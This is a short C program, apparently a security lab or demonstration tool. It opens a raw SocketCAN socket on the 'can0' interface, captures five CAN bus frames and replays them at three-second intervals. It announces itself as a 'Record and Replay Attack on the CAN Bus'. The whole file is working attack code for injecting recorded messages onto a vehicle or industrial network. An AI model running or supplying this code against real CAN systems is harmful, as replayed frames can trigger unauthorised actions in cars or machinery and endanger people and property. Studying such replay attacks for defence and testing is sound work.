#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <linux/can.h>
#include <linux/can/raw.h>
#include <time.h>

int main(int argc, char **argv)
{
    int s; 
	int nbytes;
	struct sockaddr_can addr;
	struct ifreq ifr;
	struct can_frame frame;
	/*
		struct can_frame {
			canid_t can_id;  32 bit CAN_ID + EFF/RTR/ERR flags
			__u8    can_dlc; frame payload length in byte (0 .. 8)
			__u8    __pad;   padding
			__u8    __res0;  reserved / padding
			__u8    __res1;  reserved / padding
			__u8    data[8] __attribute__((aligned(8)));
		};
	*/
	printf("Record and Replay Attack on the CAN Bus\r\n");

	if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0)
    {
		perror("Socket");
		return 1;
	}

	strcpy(ifr.ifr_name, "can0" );
	ioctl(s, SIOCGIFINDEX, &ifr);

	memset(&addr, 0, sizeof(addr));
	addr.can_family = AF_CAN;
	addr.can_ifindex = ifr.ifr_ifindex;

	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("Bind");
		return 1;
	}

	struct can_frame messages[5];

	for (int count = 0; count < 5; count++)
	{
		nbytes = read(s, &frame, sizeof(struct can_frame));
		
	 	if (nbytes < 0) {
			perror("Read");
			return 1;
		}
		messages[count] = frame;
	}
	
	for (int count = 0; count < 5; count++)
	{
		if (write(s, &messages[count], sizeof(struct can_frame)) == sizeof(struct can_frame)) 
		{
			printf("Sent: 0x%X [%d]", messages[count].can_id,messages[count].can_dlc);
			
			for (int j = 0; j < messages[count].can_dlc; j++)
				printf("\t%X", messages[count].data[j]);
			printf("\r\n");
		}
		else
		{
			perror("Write");
			return 1;
		}
		sleep(3);
	}

	if (close(s) < 0) {
		perror("Close");
		return 1;
	}

	return 0;
}
